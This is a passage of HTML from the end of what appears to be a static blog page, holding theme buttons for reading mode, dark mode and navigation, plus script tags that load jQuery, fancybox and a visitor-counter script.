type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>